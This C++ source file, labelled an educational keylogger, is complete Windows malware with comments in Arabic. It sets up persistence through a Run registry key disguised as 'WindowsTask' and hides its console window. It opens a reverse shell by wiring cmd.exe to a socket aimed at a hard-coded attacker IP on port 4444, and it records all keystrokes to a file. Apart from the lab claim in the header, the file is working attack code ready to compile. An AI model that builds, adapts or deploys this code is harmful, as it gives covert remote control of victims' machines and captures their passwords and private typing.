// =============================================================================
// keylogger_edu.cpp — Educational Keylogger (Full Version with Persistence)
// =============================================================================
//
// PURPOSE: Study the anatomy of a keylogger and persistence mechanisms.
// ENVIRONMENT: Isolated Lab / Virtual Machine.
// 
// COMPILATION: ******Very Impotant****** You should use this flag during execution
// g++ keylogger_edu.cpp -o keylogger_edu.exe -lws2_32 -static -mwindows
// =============================================================================

#include <winsock2.h>
#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <thread>
#include <string>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// ---------------------------------------------------------------------------
// CONFIGURATION
// ---------------------------------------------------------------------------
#define ATTACKER_IP   "172.20.205.57"   // IP الخاص بجهازك (المهاجم)
#define ATTACKER_PORT 4444             // البورت الذي يستمع عليه ncat
#define LOG_FILE      "Record.txt"     // ملف تسجيل المفاتيح

// ---------------------------------------------------------------------------
// Function declarations
// ---------------------------------------------------------------------------
void hide();
void log();
bool SetPersistence(string exePath);

// ---------------------------------------------------------------------------
// Global network variables
// ---------------------------------------------------------------------------
WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFOA ini_processo{};
PROCESS_INFORMATION processo_info{};

// ---------------------------------------------------------------------------
// Persistence Module — تضمن تشغيل البرنامج عند إعادة التشغيل عبر الـ Registry
// ---------------------------------------------------------------------------
bool SetPersistence(string exePath) {
    HKEY hKey;
    // استخدام مفتاح الـ Run في الـ Registry لضمان التشغيل مع المستخدم الحالي
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // فتح المفتاح بصلاحية الكتابة
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }

    // إضافة المسار تحت اسم مموه ليبدو كأنه عملية نظام
    result = RegSetValueExA(hKey, "WindowsTask", 0, REG_SZ, 
                            (const BYTE*)exePath.c_str(), exePath.length() + 1);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// ---------------------------------------------------------------------------
// ConnectThread — إنشاء وإدارة الاتصال بالـ Attacker
// ---------------------------------------------------------------------------
DWORD WINAPI ConnectThread(LPVOID arg) {
    for (;;) {
        memset(&ini_processo, 0, sizeof(ini_processo));
        ini_processo.cb        = sizeof(ini_processo);
        ini_processo.dwFlags   = STARTF_USESTDHANDLES;
        ini_processo.hStdInput = ini_processo.hStdOutput =
            ini_processo.hStdError = (HANDLE)Winsock;

        WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    }
    return 0;
}

// ---------------------------------------------------------------------------
// ShellThread — تشغيل cmd.exe وتوجيه الـ I/O عبر الـ Socket
// ---------------------------------------------------------------------------
DWORD WINAPI ShellThread(LPVOID arg) {
    for (;;) {   
        char commandLine[] = "cmd.exe";
        if (CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info) == true) {
            break;
        } else {
            WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
            CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// main — نقطة الانطلاق الرئيسية
// ---------------------------------------------------------------------------
int main() {
    // 1. الحصول على المسار الكامل للملف الحالي لتفعيل الاستمرارية
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    string currentExePath = buffer;

    // 2. تفعيل الاستمرارية (Persistence)
    SetPersistence(currentExePath);

    // 3. إخفاء نافذة الكونسول
    hide();

    // 4. إعداد مكتبة الشبكات (Winsock)
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    hax.sin_family      = AF_INET;
    hax.sin_port        = htons(ATTACKER_PORT);
    hax.sin_addr.s_addr = inet_addr(ATTACKER_IP);

    // 5. إنشاء خيوط العمل (Threads) للشبكة والـ Shell
    CreateThread(NULL, 0, ConnectThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ShellThread,   NULL, 0, NULL);

    // 6. بدء عملية تسجيل المفاتيح (Logging) في Thread منفصل
    thread logThread(log);

    if (logThread.joinable()) {
        logThread.join();
    }

    return 0;
}

// ---------------------------------------------------------------------------
// log — محرك تسجيل الضغطات على لوحة المفاتيح
// ---------------------------------------------------------------------------
void log() {
    unsigned char c;

    for (;;) {
        for (c = 8; c < 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                ofstream write(LOG_FILE, ios::app);

                if ((c > 64) && (c < 91) && !(GetAsyncKeyState(0x10))) {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91)) {
                    write << c;
                    write.close();
                    break;
                }
                else {
                    switch (c) {
                        case 48: if (GetAsyncKeyState(0x10)) write << ")"; else write << "0"; break;
                        case 49: if (GetAsyncKeyState(0x10)) write << "!"; else write << "1"; break;
                        case 50: if (GetAsyncKeyState(0x10)) write << "@"; else write << "2"; break;
                        case 51: if (GetAsyncKeyState(0x10)) write << "#"; else write << "3"; break;
                        case 52: if (GetAsyncKeyState(0x10)) write << "$"; else write << "4"; break;
                        case 53: if (GetAsyncKeyState(0x10)) write << "%"; else write << "5"; break;
                        case 54: if (GetAsyncKeyState(0x10)) write << "^"; else write << "6"; break;
                        case 55: if (GetAsyncKeyState(0x10)) write << "&"; else write << "7"; break;
                        case 56: if (GetAsyncKeyState(0x10)) write << "*"; else write << "8"; break;
                        case 57: if (GetAsyncKeyState(0x10)) write << "("; else write << "9"; break;

                        case VK_LBUTTON: write << " <Leftclick> \n"; break;
                        case VK_RBUTTON: write << " <Rightclick> "; break;
                        case VK_BACK: write << "<backspace>"; break;
                        case VK_TAB: write << "<\t\t>"; break;
                        case VK_RETURN: write << "<enter> \n"; break;
                        case VK_SHIFT: write << "<shift> \n"; break;
                        case VK_CONTROL: write << "<control>"; break;
                        case VK_MENU: write << "<Alt>"; break;
                        case VK_PAUSE: write << "<pause/break>"; break;
                        case VK_CAPITAL: write << "<Capslock>"; break;
                        case VK_ESCAPE: write << "<escape>"; break;
                        case VK_SPACE: write << " "; break;
                        case VK_NEXT: write << "<Pagedown>"; break;
                        case VK_END: write << "<end>"; break;
                        case VK_HOME: write << "<home>"; break;
                        case VK_LEFT: write << "<Leftarrow>"; break;
                        case VK_UP: write << "<Uparrow>"; break;
                        case VK_RIGHT: write << "<Rightarrow>"; break;
                        case VK_DOWN: write << "<Downarrow>"; break;
                        case VK_INSERT: write << "<insert>"; break;
                        case VK_DELETE: write << "<delete>"; break;
                        case VK_MULTIPLY: write << "*"; break;
                        case VK_ADD: write << "+"; break;
                        case VK_SUBTRACT: write << "-"; break;
                        case VK_DIVIDE: write << "/"; break;
                        case VK_F1: write << "F1"; break;
                        case VK_F2: write << "F2"; break;
                        case VK_F3: write << "F3"; break;
                        case VK_F4: write << "F4"; break;
                        case VK_F5: write << "F5"; break;
                        case VK_F6: write << "F6"; break;
                        case VK_F7: write << "F7"; break;
                        case VK_F8: write << "F8"; break;
                        case VK_F9: write << "F9"; break;
                        case VK_F10: write << "F10"; break;
                        case VK_F11: write << "F11"; break;
                        case VK_F12: write << "F12"; break;
                        case VK_NUMLOCK: write << "<Numlock>"; break;
                        case VK_SCROLL: write << "<scroll> \n"; break;
                        case VK_LSHIFT: write << "<Leftshift>"; break;
                        case VK_RSHIFT: write << "<Rightshift>"; break;
                        case VK_LCONTROL: write << "<Leftcontrol>"; break;
                        case VK_RCONTROL: write << "<Rightcontrol>"; break;
                        case VK_LMENU: write << "<Leftmenu>"; break;
                        case VK_RMENU: write << "Rightmenu"; break;
                        case VK_OEM_1: write << "<;:>"; break;
                        case VK_OEM_PLUS: write << "<+>"; break;
                        case VK_OEM_COMMA: write << "<comma>"; break;
                        case VK_OEM_MINUS: write << "<->"; break;
                        case VK_OEM_PERIOD: write << "<.>"; break;
                        case VK_OEM_2: write << "</? >"; break;
                        case VK_OEM_3: write << "<`~>"; break;
                        case VK_OEM_4: write << "<{[>"; break;
                        case VK_OEM_5: write << "<|\\>"; break;
                        case VK_OEM_6: write << "<]}>"; break;
                        case VK_OEM_7: write << "<'\">"; break;
                        default: write << c; break;
                    }
                    write.close();
                    break;
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// hide — إخفاء نافذة الكونسول
// ---------------------------------------------------------------------------
void hide() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}